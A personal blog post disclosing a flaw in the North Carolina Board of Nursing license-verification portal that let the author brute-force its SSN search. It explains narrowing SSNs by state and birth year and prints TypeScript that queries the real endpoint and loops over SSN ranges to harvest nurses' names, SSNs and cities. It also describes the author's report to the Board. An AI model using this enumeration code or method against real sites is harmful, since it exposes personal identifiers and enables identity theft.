---
layout: project
title: Social security number vulnerability for NC Nurses
thumbnail: images/fetchbyssn.png
stack:
  - TypeScript
slug: ncbon-summary
source: https://github.com/willkrakow
publicId: carbon_1_okmryp
description: State agency website reveals social security numbers for registered nurses in North Carolina
date: 2023-02-21
---

A few months back my wife started a new nursing job. Around 10AM on her first day, she called and asked me to look up the renewal deadline for her nursing license. Being the good work-from-home husband that I am, I did some Googling and landed on the [North Carolina Board of Nursing License Verification Portal](https://portal.ncbon.com/LicenseVerification/search.aspx).

The portal offers three ways to search for a license: by name, by license number, and by **social security number**. This last one caught my eye - any time a feature related to SSNs is presented on a publicly facing website there's a possibility for data leaks. And state governments have shown [a lack of diligence](https://arstechnica.com/tech-policy/2021/10/missouri-gov-calls-journalist-who-found-security-flaw-a-hacker-threatens-to-sue/) with respect to their employees SSNs before. So I began digging, for evidence of data mishandling.

**What I found was that I could brute force the SSN search feature to get a list of names, social security numbers, and cities of residence for a large portion of nurses, nursing assistants, and nurse practitioners registered in the state of North Carolina.**

---

To understand how this was possible - almost trivially so - we first need to examine domain of our search: the 1 billion possible nine-digit social security numbers.

The fact that SSNs serve as our nation's de facto 'password' that citizens must use to navigate legal, financial, and professional systems in the United States is somewhat of a duct-tape job. SSNs were never meant to be such a sensitive, critical token - they were introduced to keep track of income taxes. Cards issued between 1946 and 1972 were labeled ["Not for identification purposes"](https://web.archive.org/web/20120629234649/http://www.americanchronicle.com/articles/view/3911). However, in the 1960s, [the government shoehorned them into their current general identification role](https://www.ssa.gov/history/reports/ssnreportc2.html) to simplify digital record-keeping across agencies.

> Ironically, despite serving as a pseudo-password to opening a credit card, verifying a license, or retrieving sensitive medical information, SSNs would fail nearly all password requirement checks on modern websites. 

In 2011, the Social Security Administration [began assigning SSNs in a pseudorandom fashion](https://www.ssa.gov/employer/randomization.html), rather than by state (as it did prior to 1972) or ZIP code (1972-2011) as it had in the past. But for those of us born prior to 2011, a bad actor only needs to know the year and US state in which someone was born to quickly assert the first three numbers (e.g., `123-##-####`), or at least a range of those first three numbers (e.g., `123-##-####` through `125-##-####`). Even the largest state by population, California, had only 81 possible three-digit prefixes between 1973 and 2011 - that means we can be certain that a person born in California between those years *does not* have an SSN in the remaining **99.2%** of all possible combinations.

For those whose parents applied for a social security card in North Carolina between 1972 and 2011 - your SSN is either between `237-##-####` and `246-##-####`, or (less likely) `681-##-####` and `690-##-####`.

---

So back to my "hacking". I began by digging in the most obvious place: the HTML source and the network requests. I searched for my wife by name, then opened up the dev console and did a quick regex search various forms of her SSN (e.g., `#########`, `###-##-####`, `### ## ####`) - and came up empty. Good!

The network requests were also clean - they *were* sending SSNs as a query parameter to the a `/Search.aspx` endpoint, but it seemed resistant to trivial SQL injections. Another point for the Board.

I had assumed that the endpoint would be rate limited and protected with some sort of malicious threat protection, but even after nearly an hour of entering obvious SQL injections and malformed requests, my IP hadn't been blocked. Maybe I could just brute force this?

To test my theory, I copied the `/Search.aspx` API call as a curl request and sent a few test payloads. And there it was - the API was returning different response statuses for positive results and negative results, and the results list for a given SSN query was serialized in an ASP.NET `_VIEWSTATE` attribute.

To test the extent of this vulnerability I wrote ~50 lines of TypeScript that would loop through a shortened list of 1 million numbers (e.g., `###-00-0000` through `###-99-9999`) and check if the response had results or not. I let that script run for about 20 minutes - with no interval randomization, no IP address shuffling, no proxy server, and managed to construct a list of over 1000 names, SSNs, and cities of residence for the nurses of North Carolina. With a little optimization, I'm confident I could retrieve thousands of results in an equally short amount of time.

Here are the important bits of the code.

<details>
    <summary>Performing a search by SSN</summary>

```typescript
const fetchBySSN = (num: string) => fetch("https://portal.ncbon.com/LicenseVerification/search.aspx", {
        method: "POST",
        headers: {
            "accept": "text/html,application/xhtml+xml",
            "content-type": "application/x-www-form-urlencoded",
            "sec-fetch-dest": "document",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "cookie": `ASP.NET_SessionId=${SESSION_ID}`
        },

        "referrerPolicy": "strict-origin-when-cross-origin",
        "referrer": "https://portal.ncbon.com/LicenseVerification/search.aspx",
        body: `__VIEWSTATE=%...txtSSN=${num}&...`,
})
```
</details>

> Negative results contain the string "unable to locate any results...". Positive results will contain any empty <ul> for the error messages

<details>
<summary>Fetching the results</summary>

```typescript

const fetchResultsList = () => fetch("https://portal.ncbon.com/LicenseVerification/resultList.aspx", {
        headers: {
            "authority": "portal.ncbon.com",
            "accept": "text/html,application/xhtml+xml",
            "cache-control": "no-cache",
            "cookie": `ASP.NET_SessionId=${SESSION_ID}`,
            "referer": "https://portal.ncbon.com/licenseverification/search.aspx",
            "sec-fetch-dest": "document",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1"
        }
})
```
</details>

<details>
<summary>Sample response</summary>

```html
...
<tr>
	<td>M**** P*******</td>
	<td>Asheville, NC</td>
	<td>NAII Listing</td>
	<td class="text-right">
        <input type="button" value="View Record" class="btn btn-info btn-xs" onclick="document.location='/LicenseVerification/result.aspx?ID=7****5';" />
    </td>
</tr>
...
```
</details>

<details>
    <summary>Looping through the range of SSNs</summary>

```typescript
const prefixes = ['']

const ssnFetches = async () => {
    const filename = path.join(__dirname, 'results_new.txt');
    fs.appendFileSync(filename, 'Results');

    let totalFound = 0;

    for await (let prefix of prefixes) {
        for (let i = 1; i < 100; i++) {
            let areaCode = `${i}`;
            if (i < 10) {
                areaCode = `0${i}`
            }
            for (let j = 9998; j > 1000; j--) {
                let lastFour = `${j}`
                const fullSSN = `${prefix}-${areaCode}-${lastFour}`
                try {
                    const res = await fetchBySSN(fullSSN);
                    if (res.status !== 200) {
                        console.error("Error fetching")
                        console.error(res.statusText)
                        continue
                    }
                    const text = await res.text()
                    if (text.includes('unable to locate any results matching ')) {
                        console.info(`No matches for ${fullSSN}`)
                        continue;
                    }
                    const resultString = `${fullSSN} - is a nurse\n`

                    const resultResponse = await fetchResultsList(); // Fetch the results HTML using the same session cookie
                    const resultHtml = await resultResponse.text();
                    const document = new jsDom.JSDOM(resultHtml);
                    const nodes = document.window.document.querySelectorAll("div.primaryContent tr"); // Grab the results from the <table>
                    const results = [...nodes]
                        .slice(1) // Remove header row
                        .map(row => ({
                            name: row.children[0].innerHTML,
                            location: row.children[1].innerHTML,
                            ssn: fullSSN,
                        }));
                    fs.appendFileSync(filename, JSON.stringify(results));
                    totalFound += 1;
                    console.log(`total found: ${totalFound}`)
                    console.log(resultString)
                } catch (err) {
                    console.error(err)
                }
            }
        }
    }    
}
```
</details>

---

I reported these findings to the NCBON immediately after discovery and initial documentation. About 24 hours later, I still hadn't heard back, though they had commented out the section of HTML that displayed the SSN search so they clearly read my message. However, the API endpoint was still open, and again I was able to exploit it with no problems. I sent another message mentioning this, and a few hours later received a call from the Board's Chief Legal Officer.

The legal officer apologized for the delay, thanked me for being forthcoming, and we set up a time to meet with the IT Director to discuss the issue the following day. I sent over the scripts, payloads, screenshots, and a timeline as well as a summary of my findings and recommendations, and they said they'd get back to me with any questions.

---

It's been about 45 days since that call, which is more than the 30 day disclosure window I thought was adequate. Last I checked, the endpoint was still open.



